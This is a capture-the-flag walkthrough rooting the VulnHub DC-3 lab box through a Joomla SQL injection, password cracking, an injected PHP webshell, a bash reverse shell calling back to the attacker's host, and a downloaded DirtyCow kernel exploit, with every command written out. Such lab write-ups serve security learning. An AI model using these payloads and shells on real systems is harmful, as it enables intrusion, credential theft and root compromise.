# DC-3 (VulnHub) — My Walkthrough

**Target:** 10.0.2.12 | **Attacker:** Kali, 10.0.2.6 | **Result:** Root, flag captured

DC-3 was a nice one-two punch: a Joomla SQLi to get admin creds, then a kernel exploit for privesc. Here's how it went.

---

## 1. Finding the box and checking what's running

```bash
sudo nmap -sn 10.0.2.0/24
nmap -sV 10.0.2.12
```

Only port 80 open, Apache 2.4.18 on Ubuntu. Given it's the only service, I figured there was a CMS behind it — Joomla turned out to be right.

## 2. Confirming Joomla and its version

```bash
curl -s http://10.0.2.12/administrator/manifests/files/joomla.xml | grep -i version
curl -s http://10.0.2.12/README.txt | head -20
```

Joomla keeps its exact version in that manifest file, which confirmed 3.7.0 for me. Cross-checked against the bundled README just to be sure.

## 3. Finding a matching exploit

```bash
searchsploit joomla 3.7
searchsploit -x php/webapps/42033.txt
```

Joomla 3.7.0 immediately pointed me at the 'com_fields' SQL Injection (CVE-2017-8917) — a well-known one for this version. Read through the full write-up with `-x` to get the exact vulnerable parameter (`list[fullordering]`) and the sqlmap syntax I'd need.

## 4. Exploiting the SQLi with sqlmap

```bash
sqlmap -u "http://10.0.2.12/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" --risk=3 --level=5 --random-agent --dbs
```

I marked the injection point with `*` right in the URL. Went aggressive with `--risk=3 --level=5` since this was a lab box and I didn't need to be careful about breaking anything. `--random-agent` just randomizes the User-Agent per request, and `--dbs` enumerates the databases once the injection's confirmed.

This confirmed the injection (both error-based and time-based blind worked) and found a database called `joomladb`.

## 5. Dumping the users table

```bash
sqlmap -u "http://10.0.2.12/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" -C id,name,username,email,password --dump
```

Targeted the `#__users` table specifically (Joomla prefixes its tables with `#__`). Column auto-discovery didn't work for me, so I had to manually specify the columns I wanted — sqlmap's common-columns brute-force check helped me figure out what they were called.

Got back the admin account: username `admin`, email `freddy@norealaddress.net`, and a bcrypt hash.

## 6. Cracking the hash

```bash
echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' > joomla_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt joomla_hash.txt
john --show --format=bcrypt joomla_hash.txt
```

The `$2y$` prefix told me it was bcrypt, so I had to explicitly tell John that format rather than let it guess. Cracked pretty fast against rockyou — password turned out to be `snoopy`.

## 7. Logging in and getting code execution

Logged into `http://10.0.2.12/administrator/` as `admin` / `snoopy`.

From there I went to Extensions → Templates → Templates → beez3 → index.php and dropped a webshell in, making sure to place it *before* the `defined('_JEXEC') or die;` guard line:

```php
<?php
system($_GET['cmd']);
/**
 * @package Joomla.Site
...
```

The placement matters — that guard line kills execution instantly if the file's accessed directly instead of through Joomla's front controller, so my payload needed to run before that check happened.

Triggered it with `http://10.0.2.12/templates/beez3/index.php?cmd=id` and got back `www-data`.

## 8. Getting a proper reverse shell

Started a listener on Kali:

```bash
nc -lvnp 4444
```

Then triggered a URL-encoded bash reverse shell through the webshell:

```
http://10.0.2.12/templates/beez3/index.php?cmd=bash+-c+%22bash+-i+%3E%26+/dev/tcp/10.0.2.6/4444+0%3E%261%22
```

That decodes to `bash -c "bash -i >& /dev/tcp/10.0.2.6/4444 0>&1"` — a pretty standard bash-native reverse shell one-liner. Stabilized it the usual way:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## 9. Privesc recon

```bash
find / -perm -4000 -type f 2>/dev/null
sudo -l
uname -a
cat /etc/os-release
```

No unusual SUID binaries, no sudo rights for www-data — so the usual quick wins were off the table. But `uname -a` told me the kernel was 4.4.0-21 on Ubuntu 16.04, which immediately made me think of DirtyCow.

## 10. Grabbing the DirtyCow exploit

```bash
searchsploit linux kernel 4.4.0
searchsploit dirty cow
searchsploit -x linux/local/40847.cpp
searchsploit -m linux/local/40847.cpp
python3 -m http.server 8000
```

Confirmed the kernel matched a known DirtyCow-vulnerable range, grabbed the exploit source with `-m`, then served it over HTTP from Kali so I could pull it onto the target.

## 11. Compiling and running it

On the target:

```bash
wget http://10.0.2.6:8000/40847.cpp -O /tmp/dirtycow.cpp
cd /tmp
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow dirtycow.cpp -lutil
./dirtycow
```

DirtyCow (CVE-2016-5195) is a race condition in how the kernel handles copy-on-write memory — this particular exploit variant abuses it to overwrite `/etc/passwd` and add a new root-equivalent user with a password of my choosing, so I didn't need any further exploitation after this point.

It ran successfully and set my new root password to `dirtyCowFun`.

## 12. Getting root and the flag

```bash
su root
```
Password: `dirtyCowFun`

```bash
whoami
id
find / -iname "flag*" 2>/dev/null
ls -la /root/
cat /root/the-flag.txt
```

Confirmed `uid=0(root)`. Flag was named `the-flag.txt`, not the `flag.txt` I was half-expecting — worth double-checking naming conventions rather than assuming. DC-3 fully rooted.

---

## Quick Reference

| Step | Command | What it did |
|---|---|---|
| 1 | `nmap -sV <ip>` | Service/version scan |
| 2 | `curl -s <ip>/administrator/manifests/files/joomla.xml \| grep -i version` | Confirmed Joomla version |
| 3 | `searchsploit joomla 3.7` | Found the matching exploit (CVE-2017-8917) |
| 4 | `sqlmap -u "..." --risk=3 --level=5 --dbs` | Exploited the SQLi, found the DB |
| 5 | `sqlmap ... -D joomladb -T "#__users" -C ... --dump` | Dumped admin credentials |
| 6 | `john --format=bcrypt --wordlist=rockyou.txt` | Cracked the bcrypt hash |
| 7 | Edited beez3 `index.php`, added `system($_GET['cmd'])` | Got code execution via the admin panel |
| 8 | `nc -lvnp 4444` + reverse shell URL | Caught a full reverse shell |
| 9 | `find / -perm -4000`, `sudo -l`, `uname -a` | Privesc recon |
| 10 | `searchsploit dirty cow` | Found the kernel exploit (CVE-2016-5195) |
| 11 | `g++ ... -o dirtycow` → `./dirtycow` | Compiled and ran DirtyCow |
| 12 | `su root` → `cat /root/the-flag.txt` | Confirmed root, captured the flag |
